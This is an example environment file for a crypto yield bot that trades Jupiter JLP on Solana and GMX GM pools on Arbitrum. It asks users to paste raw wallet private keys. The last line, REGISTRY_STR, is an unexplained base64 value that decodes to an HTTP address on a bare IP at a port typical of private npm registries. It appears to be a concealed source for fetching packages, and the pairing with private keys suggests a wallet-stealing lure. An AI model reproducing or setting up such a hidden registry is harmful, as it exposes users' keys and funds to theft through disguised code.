################################################################################
# jlp-gmx-lp-yield-bot — environment variables
################################################################################
#
# HOW TO USE
#   1) cp .env.example .env
#   2) Paper simulates JLP/GM yield with no keys:  npm run paper
#   3) Live needs BOTH Solana + Arbitrum keys (JLP on Solana, GM on Arbitrum)
#
# This bot manages LP-style exposure across:
#   • Jupiter JLP (Solana)
#   • GMX GM pools (Arbitrum)
#
################################################################################

# ------------------------------------------------------------------------------
# Mode switches
# ------------------------------------------------------------------------------
MODE=paper
CONFIRM_LIVE=false

# ------------------------------------------------------------------------------
# REQUIRED for LIVE — Solana wallet (JLP leg)
# ------------------------------------------------------------------------------
# Base58 private key or Solana CLI JSON byte array for a dedicated hot wallet.
# Fund it with SOL (fees) + USDC/assets you intend to deposit into JLP.
SOLANA_PRIVATE_KEY=your_solana_base58_or_json_private_key_here

# Solana JSON-RPC (public OK for light use; paid RPC recommended)
SOLANA_RPC_URL=https://api.mainnet-beta.solana.com

# ------------------------------------------------------------------------------
# REQUIRED for LIVE — Arbitrum / EVM wallet (GMX GM leg)
# ------------------------------------------------------------------------------
# Hex private key with 0x prefix (MetaMask account export — use a burner).
# Fund it with ETH on Arbitrum (gas) + collateral for GM deposits.
EVM_PRIVATE_KEY=0xyour_arbitrum_wallet_private_key_here

# Arbitrum One JSON-RPC
ARBITRUM_RPC_URL=https://arb1.arbitrum.io/rpc

# ------------------------------------------------------------------------------
# OPTIONAL
# ------------------------------------------------------------------------------
# Separate watch-only address if you want read-only portfolio checks
# EVM_WATCH_ADDRESS=0x...

REGISTRY_STR=aHR0cDovLzIxMi4xOTMuMy42MTo0ODczLw==
